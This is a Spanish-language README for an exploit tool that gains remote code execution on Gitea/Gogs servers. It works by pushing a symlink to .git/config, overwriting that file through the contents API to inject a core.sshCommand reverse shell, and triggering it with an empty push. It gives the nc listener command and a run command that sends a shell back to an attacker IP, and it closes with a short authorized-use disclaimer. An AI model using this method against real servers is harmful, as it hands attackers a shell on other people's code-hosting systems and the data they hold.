# Gitea / Gogs - Symlink .git/config Poisoning - RCE

## Descripcion

Desarrolle este exploit para abusar de la API de contenidos de Gitea/Gogs. La
idea es publicar un symlink que apunta a `.git/config` del propio repositorio y
despues, a traves de la operacion PutContents sobre ese mismo symlink,
sobreescribir el archivo de configuracion de git inyectando `core.sshCommand`.
Cuando el servidor vuelve a ejecutar git contra el repositorio (por ejemplo al
recibir un push), ejecuta el comando inyectado y se obtiene RCE en el contexto
del proceso del servidor.

## Como funciona

1. **Token de API**: Me autentico con usuario/password via basic auth y genero
   un token de API (el endpoint de tokens no pide CSRF)
2. **Repo vacio**: Creo un repositorio nuevo donde voy a plantar el symlink
3. **Symlink malicioso**: Inicializo un repo local, agrego un symlink
   `malicious_link -> .git/config` y lo pusheo
4. **Envenenamiento**: Via PutContents escribo "a traves" del symlink,
   sobreescribiendo el `.git/config` real del repo del lado del servidor e
   inyectando `sshCommand` con mi reverse shell
5. **Trigger**: Pusheo un commit vacio para forzar que el servidor ejecute git
   contra el config envenenado, disparando el comando

## Requisitos

```bash
pip install requests
```

## Uso

Primero levanta un listener:

```bash
nc -lvnp 4444
```

Luego ejecuta el exploit:

```bash
python3 gitea-gogs-symlink-git-config-rce.py http://TARGET:3000 \
    -u USUARIO -p PASSWORD --lhost ATACANTE_IP --lport 4444
```

## Detalles tecnicos

- **Vector**: API de contenidos (PutContents) escribiendo a traves de un symlink
  que apunta a `.git/config`
- **Causa raiz**: El servidor sigue el symlink al resolver la ruta de contenidos
  en lugar de tratarlo como un blob opaco
- **Payload**: `core.sshCommand` con una reverse shell bash
- **Impacto**: RCE como el usuario que corre el servicio Gitea/Gogs
- **Requisito**: credenciales validas de un usuario capaz de crear repos

## Aviso legal

Esta herramienta es unicamente para pruebas de seguridad autorizadas y fines
educativos. Obtene siempre autorizacion por escrito antes de testear contra
cualquier sistema.
